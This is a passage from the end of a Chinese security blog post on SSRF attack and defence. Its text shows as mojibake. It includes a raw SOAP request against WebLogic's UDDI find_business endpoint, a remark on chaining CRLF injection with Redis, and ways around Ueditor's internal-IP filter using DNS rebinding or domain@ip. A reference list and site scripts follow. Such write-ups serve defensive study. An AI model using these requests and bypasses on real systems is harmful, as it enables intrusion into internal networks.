<p>å‘é€çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼šï¼ˆ<strong>å› æ­¤åˆ©ç”¨ä¸Šé¢åˆ†æçš„redisç‰¹æ€§ç»“åˆcrlfï¼Œå¯ä»¥è‡ªå®šä¹‰ä¸€è¡Œheaderï¼Œè¿™æ ·å°±å®Œæˆäº†æ”»å‡»</strong>ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;hello HTTP&#x2F;1.1 
Content-Type: text&#x2F;xml; charset&#x3D;UTF-8 
User-Agent: Java
Host: test.com
Connection: Keep-Alive 

&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt; 
&lt;env:Envelope
xmlns:soapenc&#x3D;â€œhttp:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;xmlns:xsd&#x3D;â€œhttp:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;
xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;&gt; 
&lt;env:Header&gt;&lt;&#x2F;env:Header&gt;&lt;env:Body&gt; 
    &lt;ï¬nd_business generic&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;urn:uddi-org:api_v2&quot;&gt;         
    &lt;name&gt;%&lt;&#x2F;name&gt;&lt;&#x2F;ï¬nd_business&gt; 
&lt;&#x2F;env:Body&gt;&lt;&#x2F;env:Envelope&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ueditor"><a class="markdownIt-Anchor" href="#ueditor"></a> Ueditor</h2>
<p>è¿™æ˜¯ä¸€ä¸ªGETå‹çš„å¯å›æ˜¾ssrfã€‚</p>
<p>Ueditorå¯çœŸæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œ.netç‰ˆæœ¬æœ‰ä¸ªæ–‡ä»¶å†™å…¥ï¼Œjspå’Œphpç‰ˆæœ¬æœ‰ssrfã€‚</p>
<p>åœ¨æŸäº›ç‰ˆæœ¬Ueditorè¿›è¡Œäº†å†…ç½‘ipçš„patchï¼Œæ­£åˆ™åŒ¹é…ï¼Œæ— æ³•è¯·æ±‚å†…ç½‘èµ„æºã€‚</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924171735874.png" alt="image-20240924171735874" /></p>
<p>ä½¿ç”¨dnsé‡ç»‘å®šå²‚å¯ç»•è¿‡ï¼Œæˆ–è€…åˆ©ç”¨domain@ipçš„æ ¼å¼ç»•è¿‡ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h1>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1489/">https://paper.seebug.org/1489/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/255222#h2-0">https://www.anquanke.com/post/id/255222#h2-0</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179910.html">https://www.freebuf.com/articles/web/179910.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/292437.html">https://www.freebuf.com/articles/web/292437.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/">https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254387#h3-2">https://www.anquanke.com/post/id/254387#h3-2</a></p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/08/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-rbcd-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">https://exp10it.io/2023/08/åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾-rbcd-åˆ©ç”¨æ€»ç»“</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2024-10-28 15:31:58
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/SSRF/" title="SSRF">
                        #SSRF
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-text"> åº</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-text"> 0x01 å¸¸è§åˆ©ç”¨ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text"> æ–‡ä»¶è¯»å–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis"><span class="toc-text"> Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8D%8F%E8%AE%AE%E6%9C%BA%E5%88%B6"><span class="toc-text"> Redisåè®®æœºåˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%AF%86%E7%A0%81%E6%83%85%E5%86%B5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text"> æœ‰å¯†ç æƒ…å†µçš„åˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axis"><span class="toc-text"> Axis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84axis%E6%A1%88%E4%BE%8B"><span class="toc-text"> å®æˆ˜ä¸­çš„Axisæ¡ˆä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text"> äº‘æœåŠ¡å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E4%B8%9A%E5%8A%A1"><span class="toc-text"> å†…ç½‘å¸¸è§ä¸šåŠ¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-api"><span class="toc-text"> docker Api</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gitlab"><span class="toc-text"> gitlab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-fpm"><span class="toc-text"> PHP-FPM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text"> å…¶ä»–</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java-ssrf%E7%9A%84ntlm-relay"><span class="toc-text"> java SSRFçš„NTLM relay</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%BB%A3%E7%A0%81%E6%A1%88%E4%BE%8B"><span class="toc-text"> 0x02 ä»£ç æ¡ˆä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text"> PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-text"> Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dotnet"><span class="toc-text"> Dotnet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-text"> 0x03 æ¼æ´æ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-text"> å®æˆ˜ä¸­å¸¸è§å­˜åœ¨æ¼æ´çš„ç»„ä»¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text"> æ•°æ®åº“</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-text"> åˆ©ç”¨æŠ€å·§</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text"> 0x04 æ¼æ´å¸¸è§åˆ©ç”¨å®ä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#weblogic"><span class="toc-text"> weblogic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ueditor"><span class="toc-text"> Ueditor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text"> å‚è€ƒé“¾æ¥</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/cyxsec">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://cyxsec.github.io/">Copyright Â© 2024 CysSec</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer toï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97 + '&url=' + https%3A%2F%2Fcyxsec.github.io%2F2024%2F08%2FSSRF%25E6%2594%25BB%25E9%2598%25B2%25E6%258C%2587%25E5%258C%2597%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
